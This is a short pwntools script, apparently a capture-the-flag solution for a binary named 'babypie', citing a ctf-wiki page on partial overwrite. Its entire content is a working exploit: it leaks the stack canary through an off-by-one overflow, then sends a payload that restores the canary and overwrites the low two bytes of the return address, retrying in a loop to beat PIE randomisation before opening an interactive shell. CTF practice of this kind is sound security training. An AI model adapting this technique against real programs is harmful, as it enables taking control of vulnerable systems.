#coding=utf-8
# 原理 https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/#partial-overwrite
from pwn import *
context(arch = 'amd64', os = 'linux')

while  True:
	try:
		sh = process("./babypie")
		sh.sendafter(':\n', 'a'*(0x30-8+1))
		sh.recvuntil('a'*0x29)
		canary = u64('\x00'+sh.recv(7))
		payload = flat(['a'*0x28, canary, 'a'*8, '\x3E\x5A'])
		sh.sendafter(':\n', payload)
		sh.interactive()
	except:
		sh.close()
